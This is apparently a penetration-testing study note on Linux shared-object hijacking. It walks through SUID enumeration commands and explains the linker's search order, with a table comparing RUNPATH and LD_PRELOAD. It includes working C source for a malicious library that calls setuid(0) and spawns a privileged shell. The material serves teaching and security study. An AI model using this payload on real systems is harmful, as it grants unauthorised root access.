ğŸ” Shared Object Hijacking Enumeration (Linux Privilege Escalation)
ğŸ“Œ Overview
Shared Object Hijacking is a privilege escalation technique where a SUID binary loads a shared library from a user-writable path, allowing attackers to inject malicious code.

This note outlines how to enumerate and exploit this vulnerability on a compromised Linux host.

ğŸ§­ Enumeration Approach (Unprivileged User)
âœ… 1. Find SUID Binaries

      find / -perm -4000 -type f 2>/dev/null
âœ… 2. Check Loaded Libraries (with ldd)

      ldd /path/to/suid_binary

Look for:
  Missing libraries
  Non-standard paths (e.g., /tmp, /home/user/dev, etc.)

âœ… 3. Check RUNPATH/RPATH (with readelf)

      readelf -d /path/to/suid_binary | grep -E 'RPATH|RUNPATH'

Check if the path is writable:

      [ -w /path/to/suspicious ] && echo "Writable"

âœ… 4. Identify the Required Symbol

      strings /path/to/suid_binary | grep -i 'query\|auth\|connect\|load'

âœ… 5. Inject Malicious .so
      If writable path exists and required symbol is known, write a custom .so with that symbol and drop it in the target path.
-----------------------------------------------------------------------------
                  #include<stdio.h>
                  #include<stdlib.h>
                  #include<unistd.h>
                  
                  void dbquery() {
                      printf("Malicious library loaded\n");
                      setuid(0);
                      system("/bin/sh -p");
                  } 
-----------------------------------------------------------------------------

ğŸ” Flowchart: Dynamic Linkerâ€™s Library Loading Order

                 â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
                 â”‚ Run a Program â”‚
                 â””â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                        â–¼
            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â”‚ Is LD_PRELOAD Set?   â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â”‚
                      â–¼                            â”‚
   (If not SETUID) Load those libraries first      â”‚
                      â–¼                            â”‚
            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”               â”‚
            â”‚ Check LD_LIBRARY_PATHâ”‚               â”‚
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â”‚
                      â–¼                            â”‚
            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”               â”‚
            â”‚ Check RUNPATH inside â”‚               â”‚
            â”‚ the binary           â”‚               â”‚
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â”‚
                      â–¼                            â”‚
            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”               â”‚
            â”‚ Default System Paths â”‚               â”‚
            â”‚ (/lib, /usr/lib, etc)â”‚               â”‚
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜               â”‚
                      â–¼                            â”‚
            â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”               â”‚
            â”‚   Load First Match   â”‚â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

ğŸ§ª Bonus: Bash Script to Automate This

See enum_so_hijack.sh in this repo to:
        Find SUID binaries
        Run ldd
        Check RUNPATH and test write access
        Identify possibly hijackable .so files

ğŸ“Š RUNPATH vs LD_PRELOAD Comparison
Feature	                RUNPATH	                                  LD_PRELOAD
_______________________________________________________________________________________________________________
What is it?	            Hardcoded path inside the binary    	    Env variable to load .so before others
Set by	                Developer (during compilation)	          User (at runtime)
Override funcs?        	âŒ No                                    	âœ… Yes
Used for?    	          Direct library path resolution	          Hooking/debugging/injection
Ignored by SETUID?	    âŒ No (used even in SETUID)	              âœ… Yes (ignored for SETUID)
Security Risk	          Dangerous if points to writable path	    Dangerous if used incorrectly (non-SETUID)
Priority	              After LD_LIBRARY_PATH, before system	    Highest (unless SETUID)
